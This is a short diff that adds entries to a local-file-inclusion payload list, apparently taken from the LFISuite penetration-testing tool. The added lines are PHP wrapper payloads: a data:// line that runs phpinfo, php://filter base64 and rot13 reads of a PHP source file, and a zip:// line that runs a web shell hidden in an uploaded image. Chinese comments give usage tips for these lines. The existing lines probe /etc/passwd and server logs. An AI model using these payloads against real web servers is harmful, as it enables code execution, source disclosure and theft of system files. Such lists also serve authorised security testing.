@@ -1,4 +1,9 @@
 #source  https://github.com/D35m0nd142/LFISuite/blob/master/pathtotest.txt
+data:text/plain,<?php phpinfo();?>%00
+data:text/plain;base64,base64编码后的数据,注意payload不能以?>闭合???
+php://filter/read=convert.base64-encode/resource=example2.php%00
+php://filter/read=string.rot13/resource=example2.php%00
+zip://./shell.jpg%23shell.php //这个要能上传zip文件
 /etc/passwd
 ../logs/access_log
 ../logs/error_log
